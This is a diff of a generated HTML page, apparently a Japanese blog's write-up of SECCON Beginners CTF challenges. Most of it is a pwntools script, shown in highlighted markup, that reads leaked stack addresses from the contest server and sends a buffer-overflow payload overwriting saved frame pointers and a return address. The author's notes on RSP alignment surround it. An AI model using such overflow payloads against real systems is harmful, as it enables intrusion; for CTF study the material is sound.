+</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="n">base64_decode</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;result:&#34;</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>ループ回数は適当。<br />
 単純に与えられたコードの逆の処理を書いていくことで求まる。<br />
@@ -2157,7 +2157,7 @@ Input: 000000000000000000000000000000000
 <pre tabindex="0"><code>Oops! RSP is misaligned!
 Some functions such as `system` use `movaps` instructions in libc-2.27 and later.
 This instruction fails when RSP is not a multiple of 0x10.
-Find a way to align RSP! You're almost there!
+Find a way to align RSP! You&#39;re almost there!
 </code></pre><p>なんじゃと。これはCコンパイラ自作のときにも出会った「RSPは関数呼び出しの際に必ず16の倍数でなければならない」というルールそのものだった。<br />
 しかし、困った。そもそも変えたのはスタック内のアドレスでスタックポインタが変わるような操作をした覚えがない。<br />
 考えられるのは入力でオーバーフローしてスタックに積まれる値が変わったかも知れないくらいだ。<br />
@@ -2274,103 +2274,103 @@ vulnとmainそれぞれにrbpとrspの値があったのでどっちも使うん
 </span><span class="lnt">96
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">buf</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-<span class="n">send_data</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-<span class="n">main_rbp</span><span class="o">=</span><span class="s2">&#34;400ad0&#34;</span>
-<span class="n">terget_address</span><span class="o">=</span><span class="s2">&#34;400861&#34;</span>
-
-<span class="n">saved_vuln</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-<span class="n">ret_vuln</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-<span class="n">saved_main</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-<span class="n">ret_main</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-
-<span class="n">conn</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;bs.quals.beginners.seccon.jp&#39;</span><span class="p">,</span><span class="mi">9001</span><span class="p">)</span>
-
-
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">saved_vuln</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-<span class="n">saved_vuln</span><span class="o">=</span><span class="n">saved_vuln</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
-
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">ret_vuln</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-<span class="n">ret_vuln</span><span class="o">=</span><span class="n">ret_vuln</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
-
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">saved_main</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-<span class="n">saved_main</span><span class="o">=</span><span class="n">saved_main</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
-
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">ret_main</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-<span class="n">ret_main</span><span class="o">=</span><span class="n">ret_main</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">saved_main</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">ret_main</span><span class="p">)</span>
-
-<span class="c1"># padding</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="mi">4</span><span class="p">):</span>
-    <span class="n">send_data</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span>
-
-<span class="c1"># saved_vuln address</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
-    <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="nb">len</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span>
-        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mi">0</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
-
-<span class="c1"># change address</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">terget_address</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
-    <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">terget_address</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
-    <span class="n">send_data</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span>
-
-<span class="s2">&#34;&#34;&#34;
-</span><span class="s2"># ret_vuln address
-</span><span class="s2">for i in reversed(range(0,len(ret_vuln),2)):
-</span><span class="s2">    if i==len(ret_vuln)-2:
-</span><span class="s2">        send_data+=chr(int(ret_vuln[i:i+2],16)+0)
-</span><span class="s2">    else:
-</span><span class="s2">        send_data+=chr(int(ret_vuln[i:i+2],16))
-</span><span class="s2">&#34;&#34;&#34;</span>
-
-<span class="c1"># saved_main address</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">saved_main</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
-    <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="nb">len</span><span class="p">(</span><span class="n">saved_main</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span>
-        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">saved_main</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mi">0</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">saved_main</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
-
-<span class="c1"># ret_main address</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">ret_main</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
-    <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ret_main</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
-
-<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Input: &#34;</span><span class="p">)</span>
-<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>
-<span class="n">result</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
-<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_data</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_rbp</span><span class="o">=</span><span class="s2">&#34;400ad0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">terget_address</span><span class="o">=</span><span class="s2">&#34;400861&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">saved_vuln</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_vuln</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">saved_main</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_main</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;bs.quals.beginners.seccon.jp&#39;</span><span class="p">,</span><span class="mi">9001</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">saved_vuln</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">saved_vuln</span><span class="o">=</span><span class="n">saved_vuln</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_vuln</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_vuln</span><span class="o">=</span><span class="n">ret_vuln</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">saved_main</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">saved_main</span><span class="o">=</span><span class="n">saved_main</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_main</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_main</span><span class="o">=</span><span class="n">ret_main</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">saved_main</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ret_main</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="mi">4</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_data</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># saved_vuln address</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="nb">len</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># change address</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">terget_address</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">terget_address</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_data</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2"># ret_vuln address
+</span></span></span><span class="line"><span class="cl"><span class="s2">for i in reversed(range(0,len(ret_vuln),2)):
+</span></span></span><span class="line"><span class="cl"><span class="s2">    if i==len(ret_vuln)-2:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        send_data+=chr(int(ret_vuln[i:i+2],16)+0)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    else:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        send_data+=chr(int(ret_vuln[i:i+2],16))
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># saved_main address</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">saved_main</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="nb">len</span><span class="p">(</span><span class="n">saved_main</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">saved_main</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">saved_main</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ret_main address</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">ret_main</span><span class="p">),</span><span class="mi">2</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_data</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ret_main</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Input: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>色んなところのアドレスを書き換えられるようにして色々試してみたが結局ダメだった。<br />
 謎は深まるばかり。</p>
@@ -2482,103 +2482,103 @@ vulnのreturn addressをvulnのret命令に持ってきてmainのrbpをwinの関
 </span><span class="lnt">96
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">buf</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-<span class="n">send_data</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-<span class="n">main_rbp</span><span class="o">=</span><span class="s2">&#34;400ad0&#34;</span>
-<span class="n">terget_address</span><span class="o">=</span><span class="s2">&#34;400861&#34;</span>
-
-<span class="n">saved_vuln</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-<span class="n">ret_vuln</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-<span class="n">saved_main</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-<span class="n">ret_main</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
-
-<span class="n">conn</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;bs.quals.beginners.seccon.jp&#39;</span><span class="p">,</span><span class="mi">9001</span><span class="p">)</span>
-
-
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-
-<span class="n">buf</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">saved_vuln</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
